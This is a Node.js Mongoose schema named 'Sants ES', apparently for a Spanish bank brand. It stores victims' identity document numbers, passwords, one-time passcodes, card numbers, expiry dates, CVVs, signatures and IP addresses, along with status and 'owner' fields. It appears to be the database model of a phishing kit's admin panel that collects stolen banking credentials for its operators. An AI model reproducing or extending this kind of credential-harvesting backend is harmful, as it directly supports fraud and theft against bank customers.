const mongoose = require("mongoose");

const santsSchema = new mongoose.Schema({
    uniqueid: String,
    document: String,
    documentNumber: String,
    password: String,
    otp: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    signature: String,
    status: Number,
    ip: String,
    owner: String,
    timestamp: Date,
});

module.exports = mongoose.model("Sants ES", santsSchema);
